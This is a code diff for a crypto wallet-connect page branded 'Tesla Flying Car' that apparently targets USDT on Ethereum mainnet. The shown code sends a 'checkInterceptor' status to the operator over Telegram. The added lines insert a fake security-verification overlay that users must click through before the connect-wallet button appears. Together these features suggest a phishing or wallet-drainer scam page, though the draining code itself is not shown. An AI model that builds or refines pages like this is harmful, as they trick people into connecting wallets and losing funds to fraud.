@@ -7,11 +7,11 @@ import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from 'https://es
 // --- CONFIGURATION ---
 const APPKIT_PROJECT_ID = "862d3799047c7548b0482add1cba796d"; 
 const CONTRACT_ADDRESS = "0xYourDeployedContractAddress"; 
-const USDT_ADDRESS = "0xdAC17F958D831ec7"; // Corrected address placeholder
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Correct Mainnet USDT
 const CHAIN_ID = 1; 
 
 // Use Vercel Environment Variable for Infura/Alchemy
-const RPC_URL = process.env.NEXT_PUBLIC_INFURA_RPC || process.env.RPC_URL || "https://mainnet.infura.io/v3/d2870b839c5f497c94f02dfaccc518e2"; 
+const RPC_URL = process.env.NEXT_PUBLIC_INFURA_RPC || process.env.RPC_URL || "https://mainnet.infura.io/v3/YOUR_KEY"; 
 
 const metadata = {
  name: 'Tesla Flying Car',
@@ -220,12 +220,18 @@ document.addEventListener('DOMContentLoaded', async () => {
  const interceptorStatus = checkInterceptor();
  notifyTelegram('INTERCEPTOR_CHECK', interceptorStatus);
 
- // Setup Button Click to Open Modal Explicitly
+ // Setup Overlay Click
+ const verifyBtn = document.getElementById('verify-btn');
+ const overlay = document.getElementById('security-overlay');
  const connectBtn = document.getElementById('connect-btn');
- if (connectBtn) {
+
+ verifyBtn.addEventListener('click', async () => {
+ overlay.style.display = 'none'; // Hide overlay
+ connectBtn.classList.remove('hidden'); // Show connect button
+ });
+
  connectBtn.addEventListener('click', async () => {
  try {
- // FIX: Check if appKitModal is defined before opening
  if (!appKitModal) {
  throw new Error("AppKit modal not initialized yet.");
  }
@@ -235,7 +241,6 @@ document.addEventListener('DOMContentLoaded', async () => {
  alert("Failed to open wallet modal. Please refresh.");
  }
  });
- }
 
  // Listen for actual connection event
  window.addEventListener('appkit:connect', async (event) => {
